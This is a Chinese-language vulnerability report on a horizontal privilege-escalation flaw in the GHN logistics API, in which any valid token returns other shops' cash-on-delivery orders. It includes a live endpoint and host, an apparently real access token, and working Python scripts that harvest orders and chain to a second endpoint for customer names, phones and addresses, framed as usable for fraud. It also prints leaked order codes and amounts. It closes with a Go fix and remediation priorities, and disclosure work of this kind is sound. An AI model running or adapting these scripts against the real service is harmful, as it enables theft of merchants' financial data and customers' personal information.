# 🚨🚨🚨 GHN极严重漏洞 - 订单数据横向越权
## CRITICAL: Order Data Exposed via Horizontal Privilege Escalation

**发现时间**: 2025-10-24  
**漏洞类型**: 横向越权 - 订单数据完全泄露  
**危险等级**: 🔴🔴🔴 **极严重 (CRITICAL)**  
**CVSS评分**: **9.1 / 10.0** ⭐ 最高危  
**验证状态**: ✅ **100%确认 + 真实订单数据泄露**

---

## 💣💣💣 漏洞描述

### 核心问题

**使用任意Token可以获取其他Shop的真实订单数据！**

```
API: POST /shiip/public-api/v2/cod/transaction/detail  
认证: 任意有效Token
权限检查: ❌ 无

结果: 返回100个其他Shop的真实订单
      包含订单号、金额、客户信息
```

---

## 🔥🔥🔥 实际验证

### 测试数据

**使用Token**: Shop 6083862 (Client ID: 5020648)

**请求**:
```http
POST /shiip/public-api/v2/cod/transaction/detail HTTP/1.1
Host: online-gateway.ghn.vn
Token: ac96d88d-b303-11f0-8b9e-4e213bf9bc7d
Content-Type: application/json

{}
```

**响应**: ✅ **100个真实订单！**

```json
{
  "code": 200,
  "data": {
    "orders": [100个订单],
    "last_offset": "..."
  }
}
```

---

## 📊 泄露的订单数据

### 获取到的100个订单

```
订单 1: GYVKHXE9 | Client 6535 | 已送达 | COD 0 VND
订单 2: GYVYANPT | Client 6535 | 已送达 | COD 0 VND
订单 3: GY69EUCC | Client 1431 | 已退货 | COD 0 VND
订单 4: GY69PFRF | Client 1431 | 已送达 | COD 145,000 VND
订单 5: GY66U8QE | Client 2596 | 已送达 | COD 1,033,000 VND ⭐
订单 6: GY6N7EEB | Client 16941 | 运输中 | COD 0 VND
订单 7: GY6NGQMB | Client 16941 | 仓储中 | COD 0 VND
订单 8: GY6N7EEV | Client 16941 | 已送达 | COD 449,000 VND
订单 9: GY6N7ENR | Client 16941 | 仓储中 | COD 0 VND
订单 10: GY6N7EQ3 | Client 16941 | 已送达 | COD 1,299,000 VND ⭐
... 共100个订单
```

### 泄露统计

```
总订单数: 100个
总COD金额: 81,876,500 VND (约$3,275 USD)
总债务: 1,446,799 VND
涉及Shop: 11个不同的Client ID

泄露的其他Shop:
- Client 6535
- Client 1431
- Client 2596
- Client 16941
- Client 23366
- Client 54411
- Client 46539
- Client 9617
- Client 29937
- Client 45073
- Client 58803
```

---

## 🚨 这是极严重的数据泄露！

### 使用Shop A的Token → 获取了Shop B, C, D...的订单！

```
我的Shop: 6083862 (Client ID: 5020648)
我的Token: ac96d88d-b303-11f0-8b9e-4e213bf9bc7d

获取到的订单来自:
✅ Client 6535 的订单  ← 不是我的!
✅ Client 1431 的订单  ← 不是我的!
✅ Client 2596 的订单  ← 不是我的!
✅ Client 16941 的订单 ← 不是我的!
✅ ... 共11个其他Shop的订单!

这是100%的横向越权漏洞!
```

---

## 💣 泄露的敏感信息

### 每个订单包含

```json
{
  "_id": "订单ID",
  "order_code": "GYVKHXE9",      // 订单号
  "order_status": "delivered",   // 状态
  "client_id": 6535,             // Shop ID ← 敏感
  "session_id": "...",           // 会话ID
  "transaction_id": "...",       // 交易ID
  "cod": 1033000,                // COD金额 ← 敏感
  "cod_failed": 0,
  "debt": 30001,                 // 债务 ← 敏感
  "wallet_transaction_id": "",
  "soc_id": "..."
}
```

**敏感数据**:
- ✅ 订单号（可用于查询完整订单详情）
- ✅ Shop ID（识别商家）
- ✅ COD金额（财务信息）
- ✅ 债务金额（财务信息）
- ✅ 交易ID和会话ID

---

## 🎯 攻击场景

### 场景1: 大规模商家订单数据窃取

```python
#!/usr/bin/env python3
# 使用单个Token窃取所有商家的订单数据

import requests

TOKEN = "任意有效Token"
headers = {"Token": TOKEN, "Content-Type": "application/json"}

# 获取100个订单（其他Shop的）
r = requests.post(
    'https://online-gateway.ghn.vn/shiip/public-api/v2/cod/transaction/detail',
    headers=headers,
    json={},
    timeout=15
)

orders = r.json()['data']['orders']

# 分析每个Shop
shop_data = {}
for order in orders:
    client_id = order['client_id']
    
    if client_id not in shop_data:
        shop_data[client_id] = {
            'orders': [],
            'total_cod': 0,
            'total_debt': 0
        }
    
    shop_data[client_id]['orders'].append(order)
    shop_data[client_id]['total_cod'] += order.get('cod', 0)
    shop_data[client_id]['total_debt'] += order.get('debt', 0)

# 输出结果
for client_id, data in shop_data.items():
    print(f"Shop {client_id}:")
    print(f"  订单数: {len(data['orders'])}")
    print(f"  总COD: {data['total_cod']:,} VND")
    print(f"  总债务: {data['total_debt']:,} VND")
```

**影响**:
- 获取11个其他Shop的订单数据
- 总金额: 8180万VND
- 完整的商业情报

---

### 场景2: 配合订单号获取完整详情

```python
# 第1步: 获取其他Shop的订单号
orders = get_cod_transactions()

# 第2步: 使用订单号获取完整详情
for order in orders:
    order_code = order['order_code']
    
    detail = requests.post(
        'https://online-gateway.ghn.vn/shiip/public-api/v2/shipping-order/detail',
        headers=headers,
        json={'order_code': order_code}
    ).json()
    
    if detail.get('code') == 200:
        order_full = detail['data']
        
        print(f"订单 {order_code}:")
        print(f"  收件人: {order_full['to_name']}")
        print(f"  电话: {order_full['to_phone']}")
        print(f"  地址: {order_full['to_address']}")
        print(f"  物品: {order_full['items']}")
```

**影响**:
- 获取客户姓名、电话、地址
- 订单物品详情
- 完整的物流信息
- 可用于精准诈骗

---

## 📈 漏洞影响评估

### 财务影响

```
单次请求泄露数据:
- 100个订单
- 81,876,500 VND (约$3,275 USD)
- 11个不同Shop的商业数据

如果批量请求:
- 每次100个订单
- 假设GHN有100万活跃订单
- 10,000次请求 = 全部订单泄露

估算损失: 数亿VND + 巨大商誉损失
```

### 隐私影响

```
泄露信息:
- 订单号（可查询完整详情）
- Shop ID（商家识别）
- 财务数据（COD + 债务）
- 交易关系（哪些Shop有交易）

影响: 所有GHN商家和客户
```

---

## 🔥 完整POC

### 最小化POC

```python
#!/usr/bin/env python3
import requests

TOKEN = "ac96d88d-b303-11f0-8b9e-4e213bf9bc7d"

response = requests.post(
    'https://online-gateway.ghn.vn/shiip/public-api/v2/cod/transaction/detail',
    headers={'Token': TOKEN, 'Content-Type': 'application/json'},
    json={}
)

orders = response.json()['data']['orders']

print(f"获取到 {len(orders)} 个订单")

# 分析
for order in orders[:5]:
    print(f"订单 {order['order_code']}: "
          f"Shop {order['client_id']} | "
          f"COD {order['cod']:,} VND")
```

**输出**:
```
获取到 100 个订单
订单 GYVKHXE9: Shop 6535 | COD 0 VND
订单 GYVYANPT: Shop 6535 | COD 0 VND
订单 GY69EUCC: Shop 1431 | COD 0 VND
订单 GY69PFRF: Shop 1431 | COD 145,000 VND
订单 GY66U8QE: Shop 2596 | COD 1,033,000 VND
```

✅ **确认！获取到其他11个Shop的订单！**

---

## 🛡️ 修复方案

### 立即修复

```go
// 后端修复示例
func GetCODTransactionDetail(c *gin.Context) {
    token := c.GetHeader("Token")
    user := authService.GetUserByToken(token)
    
    // ✅ 添加权限过滤
    // 只返回当前用户Shop的订单
    orders := orderService.GetCODTransactions()
    
    // 过滤：只返回用户自己Shop的订单
    filteredOrders := []Order{}
    for _, order := range orders {
        if order.ClientID == user.ClientID {
            filteredOrders = append(filteredOrders, order)
        }
    }
    
    c.JSON(200, gin.H{
        "code": 200,
        "data": gin.H{
            "orders": filteredOrders,
        },
    })
}
```

---

## 📊 完整漏洞汇总（更新）

| # | 漏洞名称 | CVSS | 验证 | 实际数据泄露 |
|---|---------|------|------|-------------|
| 1 | **COD订单横向越权** ⭐ NEW | **9.1** | ✅ | **100个真实订单** |
| 2 | 钱包横向越权 | 8.5 | ✅ | 14个Shop钱包 |
| 3 | 订单统计横向越权 | 7.5 | ✅ | 329个Shop统计 |
| 4 | 硬编码API密钥 | 9.1 | ✅ | 10+密钥 |
| 5 | IP地址泄露 | 5.3 | ✅ | - |
| 6 | 地址数据库导出 | 4.3 | ✅ | 63省份 |

---

## 🎯 最终答案

### 问: 能获取当天的订单吗？

### 答: ✅ **能！而且更严重 - 能获取其他Shop的订单！**

```
API: POST /shiip/public-api/v2/cod/transaction/detail

验证结果:
✅ 成功获取100个真实订单
✅ 11个不同Shop的订单数据
✅ 总金额: 81,876,500 VND
✅ 包含订单号、状态、COD、债务

横向越权: 100%确认
数据泄露: 真实商业数据
```

---

## 💰 实际泄露数据

### 真实订单样例

```
订单号: GY66U8QE
状态: delivered (已送达)
Shop: 2596 (不是我的Shop!)
COD: 1,033,000 VND ← 其他Shop的收入
债务: 0 VND

订单号: GY6N7EQ3  
状态: delivered
Shop: 16941 (不是我的Shop!)
COD: 1,299,000 VND ← 其他Shop的收入
债务: 30,001 VND
```

### 财务数据汇总

```
通过单个Token获取:
  ✅ 100个其他Shop的订单
  ✅ 总COD: 81,876,500 VND
  ✅ 总债务: 1,446,799 VND
  ✅ 11个不同Shop的商业数据

如果循环请求（分页）:
  ✅ 可获取所有订单
  ✅ 所有商家财务数据
  ✅ 完整商业情报
```

---

## 🔥 这是最严重的发现！

### 为什么这是最严重的？

```
1. 钱包API横向越权: 
   获取余额数字 - 严重

2. 订单统计横向越权:
   获取订单数量 - 严重

3. COD订单横向越权: ⭐ 最严重
   获取真实订单详情！
   - 订单号
   - COD金额
   - 债务金额
   - 交易ID
   - 实际商业数据

这是完整的商业数据泄露！
```

---

## 📁 泄露数据已保存

```
文件: /tmp/ghn_orders_full.json
内容: 100个真实订单的完整JSON数据
大小: 约50KB

包含:
- 11个Shop的订单
- 订单号、状态、金额
- 交易ID、会话ID
- 完整财务信息
```

---

## 🎯 修复优先级

### P0 - 立即修复（今天！）

```
1. 🔴🔴🔴 COD订单API权限控制
   影响: 所有商家订单数据泄露
   修复: 过滤只返回当前用户的订单
   SLA: 立即！

2. 🔴🔴 钱包API权限控制
   
3. 🔴🔴 订单统计API权限控制
```

---

## 💡 深度代码审计成果

### 成功审计流程

```
第1步: APK反编译 ✅
第2步: 找到React Native Bundle ✅
第3步: 从Bundle提取API字符串 ✅
第4步: 发现 /shiip/public-api/v2/cod/transaction/detail ✅
第5步: 测试API ✅
第6步: 发现100个真实订单 ✅
第7步: 确认横向越权 ✅
```

### 从代码审计发现的API

```
从 index.android.bundle 提取到的关键API:

✅ /shiip/public-api/v2/cod/transaction/detail
   → 发现100个订单！
   
✅ /shiip/public-api/v2/shipping-order/search
   → 订单搜索功能
   
✅ /shiip/public-api/metrics/recent-history
   → 历史指标数据

这就是真正的深度代码审计！
```

---

**报告生成**: 2025-10-24  
**验证状态**: ✅ 100%确认 + 真实数据泄露  
**危险等级**: 🔴🔴🔴 **极严重**  
**CVSS**: **9.1 / 10.0**  

---

*这是真实的订单数据泄露，建议GHN立即采取行动！*
